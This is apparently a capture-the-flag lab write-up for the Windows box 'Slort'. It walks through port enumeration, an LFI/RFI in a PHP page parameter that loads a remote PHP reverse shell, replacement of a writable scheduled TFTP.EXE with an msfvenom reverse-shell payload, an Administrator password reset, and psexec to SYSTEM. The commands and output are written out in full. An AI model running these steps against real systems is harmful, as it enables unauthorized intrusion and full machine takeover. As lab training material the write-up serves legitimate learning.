##### Tags: `schedule task`  `psexec`  `suspicious file`  `RFI`  `LFI`

# 🪟 Slort 🪟
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.211.53

PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           FileZilla ftpd 0.9.41 beta
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3306/tcp  open  mysql         MariaDB 10.3.24 or later (unauthorized)
4443/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
8080/tcp  open  http          Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
```
port 21 ftp anonymous login failed  
port 135,139,445 rpc and smb connection failed  
port 3306 mysql no credential  
port 4443 and 8080 is the same web page  
use gobuster found /site
```console
$ gobuster dir -u http://192.168.211.53:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html -b 302,404
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.211.53:8080
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/site                 (Status: 301) [Size: 346] [--> http://192.168.211.53:8080/site/]
```
when we go to the /site it brings us to /index.php?page=main.php  
```console
http://192.168.211.53:4443/site/index.php?page=main.php
```
tested the random php file and found the page is vulnerable to LFI
```console
http://192.168.211.53:4443/site/index.php?page=login.php


Warning: include(login.php): failed to open stream: No such file or directory in C:\xampp\htdocs\site\index.php on line 4
Warning: include(): Failed opening 'login.php' for inclusion (include_path='C:\xampp\php\PEAR') in C:\xampp\htdocs\site\index.php on line 4
```
hosted a php reverse shell (PHP Ivan Sincek)  
https://www.revshells.com/
```console
http://192.168.211.53:4443/site/index.php?page=http://192.168.45.228/shell2.php

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.211.53 - - [03/Apr/2026 20:07:26] "GET /shell2.php HTTP/1.0" 200 -
```
it downloaded from my host and executed  
means it have RFI as well
```console
$ penelope -p 21
[+] Listening for reverse shells on 0.0.0.0:21 →  127.0.0.1 • 10.0.2.15 • 192.168.45.228
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from SLORT 192.168.211.53 Microsoft_Windows_10_Pro-x64-based_PC 👤 slort\rupert • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/SLORT~192.168.211.53-Microsoft_Windows_10_Pro-x64-based_PC/2026_04_03-20_07_29-971.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\xampp\htdocs\site>whoami
slort\rupert
```
## Privilege Escalation
uploaded winPEASx64.exe and found there is a suspicious file C:\Backup\TFTP.EXE  
we have all the permission
```console
File Permissions "C:\Backup\TFTP.EXE": Users [Allow: AllAccess],Authenticated Users [Allow: WriteData/CreateFiles]                                                      
```
there are 2 more files
```console
C:\Backup>dir

 Directory of C:\Backup

04/03/2026  02:20 AM    <DIR>          .
04/03/2026  02:20 AM    <DIR>          ..
06/12/2020  07:45 AM            11,304 backup.txt
06/12/2020  07:45 AM                73 info.txt
04/03/2026  02:20 AM            73,802 TFTP.EXE
```
info.txt looks like its a schedule task runs every 5 minutes
```console
C:\Backup>type info.txt
Run every 5 minutes:
C:\Backup\TFTP.EXE -i 192.168.234.57 get backup.txt
```
since we have all permission, we just replace it with a reverse shell
```console
$ msfvenom -p windows/shell_reverse_tcp lhost=192.168.45.228 lport=21 -f exe > shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```
upload and wait for 5 minutes and we are administrator
```console
$ penelope -p 445
[+] Listening for reverse shells on 0.0.0.0:445 →  127.0.0.1 • 10.0.2.15 • 192.168.45.228
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from SLORT 192.168.211.53 Microsoft_Windows_10_Pro-x64-based_PC 👤 slort\administrator • Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1] • Shell Type Readline • Menu key Ctrl-D ⇐
[+] Logging to /home/ming/.penelope/sessions/SLORT~192.168.211.53-Microsoft_Windows_10_Pro-x64-based_PC/2026_04_03-20_25_03-769.log
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────
C:\WINDOWS\system32>whoami
whoami
slort\administrator
```
we can just the password of admin and run psexec to become system
```console
C:\Users\Administrator\Desktop>net user Administrator 123
The command completed successfully.
```
```console
$ impacket-psexec Administrator:123@192.168.211.53
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 192.168.211.53.....
[*] Found writable share ADMIN$
[*] Uploading file IGCRWfrS.exe
[*] Opening SVCManager on 192.168.211.53.....
[*] Creating service sRhY on 192.168.211.53.....
[*] Starting service sRhY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.19042.1387]
(c) Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32> whoami
nt authority\system
```
